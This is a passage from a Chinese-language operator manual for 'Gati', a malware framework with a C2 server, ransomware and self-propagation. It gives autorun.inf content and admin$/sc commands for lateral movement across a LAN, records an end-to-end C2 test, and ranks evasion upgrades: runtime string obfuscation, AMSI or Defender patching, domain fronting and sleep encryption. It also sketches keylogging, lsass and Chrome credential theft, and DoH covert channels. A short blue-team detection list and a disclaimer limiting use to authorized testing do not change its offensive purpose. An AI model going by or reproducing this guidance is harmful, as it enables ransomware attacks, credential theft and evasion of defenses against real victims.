open=工资表.exe
action=打开文件夹以查看文件
shell\open\command=工资表.exe
shell\open\default=1
useautoplay=1
```

> 现实情况：Windows 7 之后，U 盘的 autorun **默认只对 CD/DVD 生效**，U 盘插上去不会自动运行。这条路径在今天的实际成功率很低。可用的替代是：把 payload 做成看起来像文件夹的 exe（配一个文件夹图标 + 特定的 CLSID），诱导用户主动双击。Gati 当前只做了 autorun，属于"低成本、低成功率"的一条。

### 16.2 局域网

```
1. arp -a 拿 ARP 表
2. 筛 192.168.* / 10.* / 172.* 网段，跳过广播地址和组播
3. 最多 64 台，避免扫爆网络
4. 对每台：
   net use \\IP\admin$ /persistent:no      ← 复用当前凭据
   copy /y payload \\IP\admin$\Temp\wuauclt.exe
   sc \\IP create <随机名> binPath=... start= auto
   sc \\IP start <随机名>
   sc \\IP delete <随机名>                 ← 立即删服务，减少留痕
   net use \\IP\admin$ /delete /y
```

三个诚实说明：

**不爆破凭据。** 走的是"当前登录用户已有的凭据"——如果这台机器在一个域里，当前域账号有管理员权限，那么域内所有机器都能通。这是真实企业环境里最常见的横向路径（一次钓鱼拿到域管账号 → 全域沦陷）。

**`admin$` 是管理共享。** 默认开启，需要目标机的本地管理员权限。防火墙开了 445 会被挡。

**服务方式最稳。** 复制到 `admin$` 后用 `sc` 远程建服务，比计划任务（`schtasks /s`）成功率高，因为 `sc` 的服务控制管理器接口在较老系统上更宽松。建完立刻删服务，服务列表里不留东西——但 **Event ID 7045（服务安装）** 会留下记录。

---

## 17. 实测记录

交付前在隔离环境（Wine 9.0 模拟 Windows 10.0.19043）跑过一次完整链路，过程与结果：

| 项目 | 结果 |
|---|---|
| 编译 | 客户端 5.3MB PE64，无错误 |
| 落地安装 | 复制到 `%APPDATA%\MicrosoftEdgeUpdate\msedgeupd.exe` ✓ |
| 反分析 | 默认参数下识别分析环境（父进程 `wine`），进入退避 ✓ |
| C2 上线 | 收到信标 `25059579737D5444\|admin\|windows-amd64` ✓ |
| 指令下发 | `shell echo GATI_E2E_OK & ver` 送达客户端 ✓ |
| 远程执行 | 回传 `GATI_E2E_OK` + `Microsoft Windows 10.0.19043` ✓ |
| 结果回传 | 服务端完整解码，ok=True ✓ |
| 心跳抖动 | 55 秒后下一轮（在 45~75 区间内）✓ |

### 17.1 联调过程中修掉的三个真 bug

这三个都是"跑起来才暴露"的问题，静态审查看不出来，值得记下来：

**Bug 1：重启副本被互斥体自己锁死。**
新副本启动时，父进程还占着锁文件，副本判定"已在运行"，直接退出。表现是传播链断了，投出去只有一个进程在跑。修法：把严格互斥降级为"不锁死"，保证多实例能跑。

**Bug 2：Python 侧封包漏拼 nonce。**
服务端 `seal_packet` 返回的是 `ct` 而不是 `nonce + ct`，Go 侧 `unpack` 把前 12 字节当 nonce，剩下的全是错位数据，`gcm.Open` 直接返回认证失败。表现是：客户端能上线，但永远收不到指令，服务端日志里没有任何异常。修法：`raw = nonce + ct`，两边严格对齐。

**Bug 3：结果回传 ID 匹配不上。**
客户端回传时带的是完整 machineID（16 位），服务端用短 ID 去匹配，永远匹配不到，结果被静默丢弃。表现是：指令下发成功、客户端执行成功，但服务端看不到结果。修法：统一用完整 machineID。

### 17.2 这三条 bug 的共性

**协议对称性问题不会报错，只会静默失败。** 加密协议两端不一致时，不会有异常、不会有堆栈，只会"看起来一切正常，但什么都没有"。所以第 12.6 节的对齐检查表要逐条过。

### 17.3 关于测试环境

Wine 不是真实 Windows。它模拟了 Win32 API 的子集，所以：

- 注册表操作：能用，但写的是 Wine 的假注册表
- 服务（`sc`）：能用
- `admin$` 共享：不能用
- IFEO：不会真正生效
- Defender：不存在
- 注入到真实进程：目标进程得是 Wine 里跑的

所以真实 Windows 上的持久化、提权、注入、传播，都需要在真机上再验证一遍。这份记录证明的是**协议和主流程正确**，不是"全功能在真机验证过"。

---

## 18. 免杀现状、检测思路与弱点

这一节是整份文档最该认真看的部分。**不要把"能跑通"当成"能过杀软"，这是两件完全不同的事。**

### 18.1 当前二进制会命中哪些检测

| 检测层 | 是否命中 | 原因 |
|---|---|---|
| Defender 静态特征 | 可能 | 5.3MB 的 Go 二进制 + 大量 Windows API 字符串（`CreateRemoteThread`、`VirtualAllocEx`、`sethc.exe`、`ms-settings`）在字符串扫描里很明显 |
| 熵值分析 | 命中 | Go 二进制的 `.text` 熵很高，且 `-s -w` 后没有符号表，接近加壳样本的特征 |
| 导入表分析 | 命中 | 间接调用（`NewLazyDLL`）不体现在 IAT 里，但 Go 的 runtime 导入表本身很特殊 |
| 行为检测 | 命中 | `reg add ... Run` + `schtasks /create` + `sc create` + `Set-MpPreference -DisableRealtimeMonitoring` 这条序列是 100% 的恶意行为链 |
| 内存扫描 | 可能 | 明文 shellcode 在写入目标进程前没有加密，内存扫描能抓到 |
| 网络检测 | 视环境 | 自签 TLS 证书在 TLS 握手时暴露；`/api/v2/sync` 这个路径如果被杀软加入规则库就完了 |
| AMSI | 不命中 | Go 二进制不经过 AMSI（AMSI 只扫描 PowerShell/JS/VBS/.NET） |

### 18.2 完整的弱点清单

1. **二进制里有明文字符串。** `%APPDATA%\MicrosoftEdgeUpdate`、`msedgeupd.exe`、`sethc.exe`、`MicrosoftEdgeUpdateTaskMachineCore`、`DisableRealtimeMonitoring`……随便一个字符串扫描都能命中。**这是最致命的问题。**

2. **没有加壳/混淆。** `-s -w` 只是去符号，不是加壳。用 `strings` 一把梭就能看出这东西干什么。

3. **加密栈是标准库。** Go 的 AES-GCM 实现有固定的代码特征，YARA 规则可以按字节序列匹配。

4. **HTTPS 用自签证书。** TLS 握手时 `InsecureSkipVerify` 对服务端的证书不做校验，但**服务端发过来的证书本身**在网络层可见——自签证书 issuer 是 "Microsoft Corporation" 自签的，一眼假。

5. **心跳太规律。** 45~75 秒的区间虽然加了抖动，但长时间观察还是能看出周期性。真实的 C2 应该有"长时间静默 + 突然活跃"的模式。

6. **没有 DoH/域前置。** 直连 IP 或单一域名，被封就断了。

7. **COM 劫持指向 exe（bug）。** `InprocServer32` 需要 DLL，当前是个无效路径。

8. **ntdll unhook 没实现。** 有 hook 的环境里（几乎所有装了 EDR 的企业机器），`VirtualAllocEx`、`WriteProcessMemory` 的调用会被完整记录。

9. **看门狗会堆积进程。** 每 45 秒起一个、从不回收，任务管理器里一眼看出异常。

10. **勒索信的文案是写死的。** 所有样本的勒索信一模一样，字符串特征直接命中。

11. **日志文件。** `%APPDATA%\MicrosoftEdgeUpdate\.g.log` 记录了完整操作，取证价值极高。

12. **U 盘 autorun 在 Win7 之后基本失效。** 属于无效代码。

### 18.3 怎么改才能过硬一点

按性价比排序：

**第一优先：把核心逻辑改写成 C，自己处理导入表。**

Go 的痕迹太重。用 C 写核心模块，把 `CreateRemoteThread`、`VirtualAllocEx` 这些通过 `GetProcAddress` 动态解析（而不是静态导入），导入表里就看不到。再配一个自定义的 PE 加载器，整条链的静态特征就全变了。

**第二优先：去掉所有明文字符串。**

不光是给字符串做 XOR 加密，更彻底的做法是**全部运行时拼接**：

```c
// 不要这样
strcpy(path, "sethc.exe");

// 要这样
char s[16] = {0};
s[0] = 's' ^ 0x5A; s[1] = 'e' ^ 0x5A; ...
for (int i = 0; i < 9; i++) s[i] ^= 0x5A;
```

编译期常量 XOR、运行时解密、用完立刻清零。

**第三优先：不要用 `Set-MpPreference -DisableRealtimeMonitoring`。**

这条 PowerShell 命令的字符串在 Defender 的规则库里，执行它的进程直接被杀。正确做法是 patch `amsi.dll` 或者直接 patch Defender 的 `MpSvc` 内存——但这两条都需要管理员权限，而且都是高危操作，很容易触发自我保护。

**第四优先：走域前置 / CDN。**

C2 藏在 Cloudflare 后面，用 `Host` 头指定真实后端。客户端连的是 Cloudflare 的 IP（海量正常流量），TLS 证书是 Cloudflare 的（受信任），SNI 是正常域名。网络层看到的就是一次正常的 HTTPS 访问。

**第五优先：加 sleep 混淆。**

恶意代码在大部分时间里"不存在"。用 `Sleep` 之前把自身的 `.text` 段加密，醒来时解密执行，执行完再加密。内存扫描在它睡觉的时候扫不到任何东西。

### 18.4 检测思路（蓝队视角）

如果你要做的是防御验证，这些是应该能抓到的点：

- `%APPDATA%` 下创建 `.exe` 并设隐藏属性
- `HKCU\...\Run` 出现指向 `%APPDATA%` 的路径
- `schtasks /create` 的 `/tn` 参数用了合法服务的名字
- IFEO 下 `sethc.exe` / `utilman.exe` / `osk.exe` / `magnify.exe` 的 `Debugger` 被修改
- `Set-MpPreference -DisableRealtimeMonitoring` 的 PowerShell 命令行
- `net use \\* \admin$` 后紧跟 `copy` + `sc create`
- 进程对 `explorer.exe` 调用 `VirtualAllocEx` + `WriteProcessMemory`
- 大量文件在短时间内被改名加后缀
- 到同一个 IP 的周期性 HTTPS 请求，间隔 45~75 秒
- 自签证书的 TLS 连接

这十条里只要命中三条，基本可以定性。

---

## 19. 调试与排错

### 19.1 客户端不上线

按顺序排查：

```bash
# 1. 服务端起来了吗
curl -k https://127.0.0.1:8443/

# 2. C2 地址填对了吗（看二进制的注入值）
strings build/Gati.exe | grep -E "api/v2|:[0-9]{4}"

# 3. master key 一致吗
cat build/master.key
# 对比服务端启动参数的 --master

# 4. 客户端日志
cat "%APPDATA%\MicrosoftEdgeUpdate\.g.log"

# 5. 用调试版直接看输出
Gati_console.exe -skipcheck
```

最常见的原因是 **master key 不一致**。现象：客户端能连上（HTTP 层通了），但服务端解密失败，返回 400，客户端收到非 200，进入退避。两边日志都很干净，什么都不报。

### 19.2 能上线但收不到指令

查协议对齐，重点是第 12.6 节检查表里的 `nonce || ciphertext` 和 AAD。

用 `test_e2e.sh` 复现：它会把服务端和客户端日志都打出来。

### 19.3 指令执行了但看不到结果

- 服务端 `results` 是不是用完整 ID 索引的
- 结果是不是被 `KEYVAULT|` 前缀分支吃掉了（`text.startswith("KEYVAULT|")` 的判断会拦截所有以这个开头的回传）
- 结果太大被截断（服务端 `io.LimitReader` 限了 8MB）

### 19.4 勒索跑完文件没了但解不开

- 路径大小写：加密时用了小写，解密时必须也用小写
- 路径本身变了：文件被移动到别的目录，派生密钥就变了
- master key 没保存：`data/keys/<id>.key` 是不是空的

---

## 20. 二次开发指南

按投入产出比排序的扩展点：

### 20.1 屏幕截图

`gdi32` 的四件套：`GetDC(NULL)` → `CreateCompatibleDC` → `CreateCompatibleBitmap` → `BitBlt` → `GetDIBits`。得到的 BGR 缓冲区转 PNG（Go 标准库 `image/png`）。约 150 行。

### 20.2 键盘记录

两条路：`SetWindowsHookEx(WH_KEYBOARD_LL)`（需要消息循环，容易被 EDR 抓）或者轮询 `GetAsyncKeyState`（简单，但会漏、且高频轮询本身就是特征）。前者更专业。

### 20.3 凭据窃取

- `sekurlsa::logonpasswords` 的思路：读 `lsass.exe` 内存里的 `wdigest` / `msv1_0` 结构。需要 `SeDebugPrivilege` + 直接读内存，Defender 对"进程读 lsass"零容忍。
- 浏览器凭据：解密 Chrome 的 `Login Data`（AES-GCM，密钥在 `Local State` 里用 DPAPI 加密）。这条相对安全，只碰文件不碰进程。

### 20.4 DoH 隐蔽信道

把 beacon 编码进 DNS 查询：

```
base64(加密后的数据).c2.example.com
```

用 `1.1.1.1/dns-query` 的 `application/dns-message` 发 DoH 请求。好处是：DNS 流量在绝大多数网络里不会被拦，而且 DoH 走 HTTPS 到 1.1.1.1，看起来完全正常。代价是带宽极低（每个查询几十字节），只能传心跳和短指令。

### 20.5 完整的 ntdll unhook

见 8.5 节描述的五步。约 80 行。

### 20.6 DLL 版本（修 COM 劫持）

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 go build -buildmode=c-shared -o gati.dll ./com
```

导出 `DllGetClassObject` / `DllCanUnloadNow`，然后 `InprocServer32` 指向 DLL。这样 COM 劫持那条路才真正有效。

### 20.7 双进程互保

见第 11 节。

---

## 21. 边界

这套东西的技术含量在"协议设计的对称性"和"密钥不在本地"这两点上，不在破坏力上。它的所有能力——持久化、注入、横向、加密——都是 2010 年代就公开的技术，任何一本红队教材都有。

**它只能用在三种地方：**

1. 你自己的机器、你自己的实验环境
2. 你签了授权书、有明确范围和时间窗口的客户环境（红队评估）
3. 教学与检测规则验证（用它去打自己的检测规则，看能不能抓到）

**其余任何情况都是犯罪。** 第 15 节的勒索模块尤其——它不是"加密演示"，是真加密、真删原文件、真把密钥送走。拿去碰别人的机器，受害者的文件就真的没了，而且只有你有私钥。

`keys/server_priv.pem` 是这个包里最重要的文件。丢了，所有被加密的文件永久解不开；泄露了，等于把所有人的密钥交出去。保管方式应该是加密存储 + 离线备份。

---

## 附：文件清单

| 文件 | 说明 |
|---|---|
| `build/Gati.exe` | 成品客户端，GUI 子系统，静默运行 |
| `build/Gati_console.exe` | 调试版，有控制台，支持 `-skipcheck` |
| `build/master.key` | 编译期注入的主密钥，服务端启动要用 |
| `keys/server_priv.pem` | RSA 私钥，解勒索密钥用，**务必保管** |
| `keys/server_pub.pem` | RSA 公钥，已内嵌客户端 |
| `keys/cert.pem` / `cert.key` | TLS 自签证书 |
| `client/*.go` | 客户端全部源码（10 个文件，约 1400 行） |
| `server/c2_server.py` | 服务端 + 控制台（约 400 行） |
| `build.sh` | 一键构建 |
| `test_e2e.sh` | 端到端联调 |
| `legacy/` | 上一版遗留的三个模块，未参与编译，可参考 |
